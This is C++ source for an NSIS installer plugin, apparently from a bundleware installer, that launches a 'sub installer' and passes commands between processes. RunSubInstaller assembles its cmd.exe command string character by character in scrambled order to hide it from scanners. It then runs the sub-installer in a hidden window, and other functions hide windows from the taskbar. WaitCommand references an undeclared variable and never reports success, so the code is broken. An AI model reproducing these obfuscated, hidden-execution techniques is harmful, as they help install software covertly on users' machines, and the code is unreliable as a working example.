#include "Windows.h"
#include <stdio.h>
#include <conio.h>
#include <direct.h>
#include <Shellapi.h>
#include <string>
#include "nsis/pluginapi.h"
#define special_char ' '
#define special_offset 0x30


#define CHANNEL_NAME_INSTALLER_TO_SUB "nDYBW64KPsaAgOCz09GKHImPGH82n1VesqQLE2hj"
#define CHANNEL_NAME_SUB_TO_INSTALLER "woaSkrOObEoXQhAAvo2XITLRQdg1Nkj5HM86aEQs"

#define CMD_FUSION_READY_TO_INIT 1
#define CMD_INIT_FUSION 2
#define CMD_FUSION_INIT_COMPLITE 3
#define CMD_SHOW_FUSION 4
#define CMD_FUSION_OFFER_COMPLITE 5
#define CMD_HIDE_WINDOW 6
#define CMD_SHOW_WINDOW 7

//HWND g_hwndParent;

// Function(SetTimeout)
// {
	// EXDLL_INIT();
	// {
		// MessageBox(NULL,"SetTimeout","Deprecated",MB_ICONERROR);
	// }
// }

Function(RunSubInstaller)
{
	EXDLL_INIT();
	{
		TCHAR szPath[1024] = {0}; 
		popstring(szPath);
		
		TCHAR szFolder[1024] = {0}; 
		popstring(szFolder);

		
		PROCESS_INFORMATION PI;
		STARTUPINFO SI;

		ZeroMemory(&PI, sizeof(PI));
		ZeroMemory(&SI, sizeof(SI));

		SI.cb = sizeof(STARTUPINFO);
		SI.wShowWindow = SW_HIDE;
		SI.dwFlags = STARTF_USESHOWWINDOW;


		TCHAR cmdpath[1024] = { 0 };
		TCHAR lpRunArgs[1024] = { 0 };

		TCHAR cmd_cmd[128]; // [%s /d /c cmd.exe /d /c cmd.exe /d /c IF EXIST "%s" (start "" "%s" %s %s )]
		ZeroMemory(cmd_cmd, 128 * sizeof(TCHAR));
		// %s /d /c cmd.exe /d /c cmd.exe /d /c IF EXIST "%s" (start "" "%s" %s %s )
		cmd_cmd[7] = 'c';cmd_cmd[44] = 'T';cmd_cmd[28] = 'x';cmd_cmd[54] = 'a';cmd_cmd[45] = ' ';cmd_cmd[40] = 'E';cmd_cmd[25] = 'd';cmd_cmd[11] = 'd';
		cmd_cmd[16] = ' ';cmd_cmd[32] = 'd';cmd_cmd[60] = ' ';cmd_cmd[38] = 'F';cmd_cmd[72] = ')';cmd_cmd[56] = 't';cmd_cmd[23] = 'c';cmd_cmd[10] = 'm';
		cmd_cmd[49] = '"';cmd_cmd[35] = 'c';cmd_cmd[3] = '/';cmd_cmd[52] = 's';cmd_cmd[36] = ' ';cmd_cmd[9] = 'c';cmd_cmd[69] = '%';cmd_cmd[12] = '.';
		cmd_cmd[66] = '%';cmd_cmd[51] = '(';cmd_cmd[21] = 'c';cmd_cmd[30] = ' ';cmd_cmd[4] = 'd';cmd_cmd[70] = 's';cmd_cmd[50] = ' ';cmd_cmd[13] = 'e';
		cmd_cmd[63] = 's';cmd_cmd[59] = '"';cmd_cmd[41] = 'X';cmd_cmd[15] = 'e';cmd_cmd[14] = 'x';cmd_cmd[61] = '"';cmd_cmd[33] = ' ';cmd_cmd[8] = ' ';
		cmd_cmd[37] = 'I';cmd_cmd[55] = 'r';cmd_cmd[27] = 'e';cmd_cmd[20] = '/';cmd_cmd[43] = 'S';cmd_cmd[53] = 't';cmd_cmd[58] = '"';cmd_cmd[48] = 's';
		cmd_cmd[29] = 'e';cmd_cmd[2] = ' ';cmd_cmd[24] = 'm';cmd_cmd[65] = ' ';cmd_cmd[0] = '%';cmd_cmd[39] = ' ';cmd_cmd[47] = '%';cmd_cmd[26] = '.';
		cmd_cmd[5] = ' ';cmd_cmd[71] = ' ';cmd_cmd[67] = 's';cmd_cmd[34] = '/';cmd_cmd[19] = ' ';cmd_cmd[31] = '/';cmd_cmd[22] = ' ';cmd_cmd[64] = '"';
		cmd_cmd[17] = '/';cmd_cmd[42] = 'I';cmd_cmd[6] = '/';cmd_cmd[68] = ' ';cmd_cmd[18] = 'd';cmd_cmd[57] = ' ';cmd_cmd[46] = '"';cmd_cmd[1] = 's';
		cmd_cmd[62] = '%';

        DWORD dw = GetEnvironmentVariable("COMSPEC",cmdpath,1024);
        sprintf_s(lpRunArgs, 1024, cmd_cmd, cmdpath ,szPath , szPath, "/param=1",szFolder);

        if (!CreateProcess(cmdpath, lpRunArgs, NULL, NULL, FALSE, NULL, NULL, NULL, &SI, &PI))
        {
        }

	}
}

// Function(RunInstallerThread)
// {
	// EXDLL_INIT();
	// {
		// MessageBox(NULL,"RunInstallerThread","Deprecated",MB_ICONERROR);
	// }
// }

// Function(RunSubInstallerThread)
// {
	// EXDLL_INIT();
	// {
		// MessageBox(NULL,"RunSubInstallerThread","Deprecated",MB_ICONERROR);
	// }
// }

// Function(StopThread)
// {
	// EXDLL_INIT();
	// {
        // MessageBox(NULL,"StopThread","Deprecated",MB_ICONERROR);
	// }
// }



void CmdHideWindow(HWND hwnd)
{
	// 1. hide window
	ShowWindow(hwnd,SW_HIDE);
	// 2. hide from toolbar
	LONG Style = GetWindowLong(hwnd,GWL_EXSTYLE);
	Style = Style &~WS_EX_APPWINDOW;
	SetWindowLong(hwnd,GWL_EXSTYLE,Style);

}

void CmdShowWindow(HWND hwnd)
{
	// 1. hide window
	ShowWindow(hwnd,SW_SHOW);
	// 2. hide from toolbar
	LONG Style = GetWindowLong(hwnd,GWL_EXSTYLE);
	Style = Style | WS_EX_APPWINDOW;
	SetWindowLong(hwnd,GWL_EXSTYLE,Style);

}

Function(SendCommand)
{
	EXDLL_INIT();
    {
        TCHAR szCmd[1024] = {0}; 
        popstring(szCmd);
        std::string stmp;
        int idCommand = atoi(szCmd);

        if (idCommand == CMD_HIDE_WINDOW)
        {	
            popstring(szCmd);
            HWND hwnd = (HWND)atoi(szCmd);
            CmdHideWindow(hwnd);
            return;
        }
        else
        {
            if (idCommand == CMD_SHOW_WINDOW)
            {	
                popstring(szCmd);
                HWND hwnd = (HWND)atoi(szCmd);
                CmdShowWindow(hwnd);
                return;
            }
			else
			{
				
				popstring(szCmd);
				HWND hwnd = (HWND)atoi(szCmd);
				if (IsWindow(hwnd))
				{
					HWND hcmdWnd = GetDlgItem(hwnd,1037);
					GetWindowText(hwnd,szCmd,1024);
					int len = strlen(szCmd);
					if (len >4)
					{
						szCmd[len-2] = idCommand+special_offset;
						ShowWindow(hcmdWnd,SW_HIDE);
						bool res = SetWindowText(hcmdWnd,szCmd);
						int o=0;
					}
				}

			}
        }
    }
}

Function(WaitCommand)
{
	EXDLL_INIT();
	{

		bool cmd_reseived = false;

		TCHAR szCmd[1024] = {0}; 
		popstring(szCmd);

		TCHAR szTimeout[1024] = {0}; 
		popstring(szTimeout);

        TCHAR szTitle[1024] = {0}; 
        popstring(szTitle);


		int idCommand = atoi(szCmd);
		int timeout = atoi(szTimeout);
		timeout*=10;
		
        char cname[MAX_PATH] = {0};
        for (int i = 0; i < timeout; i++)
        {
            // check fusion exist 
            HWND fusion = FindWindow("#32770",szTitle);
            if (fusion == NULL)
            {
                int i=0;
            }

			if (hwnd)
			{
				HWND hcmdWnd = GetDlgItem(hwnd,1037);
				// get window name
				GetWindowText(hcmdWnd,cname,MAX_PATH);
				int len = strlen(cname);
				if (len > 3)
				{
	                // get command
					int cmd = cname[len-2] - special_offset;
					if (idCommand <= cmd)
					{
						break;
					}
				}
			}
			Sleep(100);
			
		}

		if (cmd_reseived == true)
		{
			
			pushstring("cmd_ok");
		}
		else
		{
			pushstring("cmd_failed");
		}
	}
}







